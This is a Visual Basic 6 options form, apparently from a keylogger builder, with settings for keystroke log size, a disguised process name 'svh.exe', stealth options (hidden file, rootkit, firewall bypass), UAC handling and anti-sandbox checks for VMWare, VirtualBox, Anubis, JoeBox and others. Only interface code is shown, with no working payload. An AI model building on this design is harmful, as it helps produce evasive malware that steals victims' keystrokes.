VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form2 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Options"
   ClientHeight    =   6015
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4095
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6015
   ScaleWidth      =   4095
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame4 
      Caption         =   "Stealth"
      Height          =   975
      Left            =   120
      TabIndex        =   18
      Top             =   4440
      Width           =   3855
      Begin VB.CheckBox Check3 
         Caption         =   "Fwb++"
         Height          =   255
         Left            =   2640
         TabIndex        =   21
         Top             =   360
         Width           =   855
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Rootkit"
         Height          =   255
         Left            =   1680
         TabIndex        =   20
         Top             =   360
         Width           =   855
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Attribut Hidden"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   360
         Width           =   1575
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Anti's"
      Height          =   1695
      Left            =   120
      TabIndex        =   7
      Top             =   2520
      Width           =   3855
      Begin VB.CheckBox anticheckn 
         Caption         =   "Virtual-PC"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   17
         Top             =   240
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "Virtual-Box"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   16
         Top             =   480
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "VMWare"
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   15
         Top             =   720
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "JoeBox"
         Height          =   255
         Index           =   3
         Left            =   120
         TabIndex        =   14
         Top             =   960
         Width           =   1575
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "CW-Sanbox"
         Height          =   255
         Index           =   4
         Left            =   120
         TabIndex        =   13
         Top             =   1200
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "Sandboxie"
         Height          =   255
         Index           =   5
         Left            =   2280
         TabIndex        =   12
         Top             =   240
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "Anubis"
         Height          =   255
         Index           =   6
         Left            =   2280
         TabIndex        =   11
         Top             =   480
         Width           =   1335
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "Threat Expert"
         Height          =   255
         Index           =   7
         Left            =   2280
         TabIndex        =   10
         Top             =   720
         Width           =   1455
      End
      Begin VB.Frame Frame5 
         Height          =   1455
         Left            =   1800
         TabIndex        =   9
         Top             =   120
         Width           =   255
         Begin VB.Line Line1 
            X1              =   120
            X2              =   120
            Y1              =   240
            Y2              =   1320
         End
      End
      Begin VB.CheckBox anticheckn 
         Caption         =   "UAC"
         Height          =   255
         Index           =   8
         Left            =   2280
         TabIndex        =   8
         Top             =   960
         Width           =   1335
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Log"
      Height          =   1335
      Left            =   120
      TabIndex        =   4
      Top             =   1080
      Width           =   3855
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   1320
         TabIndex        =   23
         Text            =   "svh.exe"
         Top             =   840
         Width           =   1335
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   1320
         TabIndex        =   5
         Text            =   "20000"
         Top             =   360
         Width           =   1335
      End
      Begin VB.Label Label2 
         Caption         =   "Name :"
         Height          =   255
         Left            =   240
         TabIndex        =   22
         Top             =   840
         Width           =   1215
      End
      Begin VB.Label Label1 
         Caption         =   "Max Frappe :"
         Height          =   255
         Left            =   240
         TabIndex        =   6
         Top             =   360
         Width           =   1215
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Sauver"
      Height          =   255
      Left            =   1080
      TabIndex        =   3
      Top             =   5640
      Width           =   1815
   End
   Begin VB.Frame Frame3 
      Caption         =   "Icon:"
      Height          =   855
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3855
      Begin VB.TextBox txtIcon 
         Height          =   285
         Left            =   840
         TabIndex        =   2
         Text            =   "Click me..."
         Top             =   360
         Width           =   2775
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   495
         Left            =   120
         ScaleHeight     =   465
         ScaleWidth      =   465
         TabIndex        =   1
         Top             =   240
         Width           =   495
      End
   End
   Begin MSComDlg.CommonDialog CDL 
      Left            =   4080
      Top             =   1320
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form2.Hide
End Sub

Private Sub txtIcon_Click()
On Error Resume Next
CDL.DialogTitle = "Please select a icon"
CDL.FileName = vbNullString
CDL.DefaultExt = "ico"
CDL.Filter = "Icon Files (*.ico) | *.ico"
CDL.ShowOpen
txtIcon.Text = CDL.FileName
Picture1.Picture = LoadPicture(CDL.FileName)

End Sub
